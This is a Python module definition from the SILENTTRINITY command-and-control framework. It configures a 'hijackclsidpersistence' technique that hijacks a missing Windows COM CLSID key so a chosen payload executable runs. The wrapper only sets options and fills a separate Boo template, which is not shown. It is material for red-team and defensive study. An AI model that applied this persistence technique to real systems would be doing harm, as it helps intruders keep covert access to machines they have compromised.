from silenttrinity.core.utils import get_path_in_package
from silenttrinity.core.teamserver.module import Module


class STModule(Module):
    def __init__(self):
        self.name = 'boo/hijackclsidpersistence'
        self.language = 'boo'
        self.description = 'Hijacks a CLSID key to execute a payload.'
        self.author = '@Daudau'
        self.references = []
        self.options = {
            'CLSID': {
                'Description'   :   'Missing CLSID to abuse.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'ExecutablePath': {
                'Description'   :   'Path to the executable payload.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Status': {
                'Description'   :   'Action to perform: add or remove\r\n/!\\remove status will remove the entire CLSID key!',
                'Required'      :   True,
                'Value'         :   ''
            }
        }

    def payload(self):
        with open(get_path_in_package('core/teamserver/modules/boo/src/hijackCLSIDpersistence.boo'), 'r') as module_src:
            src = module_src.read()
            src = src.replace('CLSD', self.options['CLSID']['Value'])
            src = src.replace('EXECUTABLE_PATH', self.options['ExecutablePath']['Value'])
            src = src.replace('STATUS', str(self.options['Status']['Value']).lower())
            return src
